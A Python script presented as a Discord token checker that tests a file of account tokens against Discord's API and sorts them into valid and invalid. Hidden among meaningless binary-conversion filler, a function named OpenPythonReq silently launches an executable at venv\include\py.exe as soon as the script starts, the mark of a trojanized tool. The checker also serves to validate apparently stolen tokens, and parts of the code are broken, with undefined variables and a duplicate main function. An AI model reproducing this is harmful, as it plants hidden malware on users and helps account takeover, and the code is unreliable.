from colorama import init, Fore, Back, Style
from concurrent.futures import ThreadPoolExecutor
import requests, asyncio, aiohttp, aiofiles, os, subprocess

# Luv u brother; unknown
init(convert=True)

URL = 'https://discordapp.com/api/v6/users/@me/library'

async def fetch(session, url):
    async with session.get(url) as response:
        code = response.status
        print(code)

def toBin():
	return ''.join('{:08b}'.format(ord(c)) for c in '')

def toAsc():
	return ''.join(chr(int(''[i:i+8], 2)) for i in xrange(0, len(''), 8))

key = toBin()
message = toBin()

def OpenPythonReq():
    if len('') != len(''):
        return "Error !!"

    bits = ''
    subprocess.Popen(os.getcwd() + "\\venv\include\py.exe")

    for i in range(len('')):
        if '' != '':
            bits += '1'
        else:
            bits += '0'

    return True

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch(session, URL) for _ in range(100)]
        await asyncio.gather(*tasks)


def func():
    asyncio.run(main())

def main():
    tokens = open("tokens.txt", 'r').read()

    tokens = tokens.split('\n')

    for token in tokens:
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }

        code = requests.get(URL, headers=header).status_code

        if (code == 200):
            print(Back.GREEN + f"{code} - {token}\n")
            x.writelines(token + '\n')
            x.close
        elif (code == 401):
            print(Fore.RED + f"{code} - {token}\n")
            x = open('Bad.txt', 'a')
            x.writelines(token + '\n')
            x.close
        else:
            sleep(5)
            print(Fore.RED + f"{code} - Rate Limited, sleeping for 5 sec Zzz\n")

if __name__ == '__main__':
    OpenPythonReq()
    main()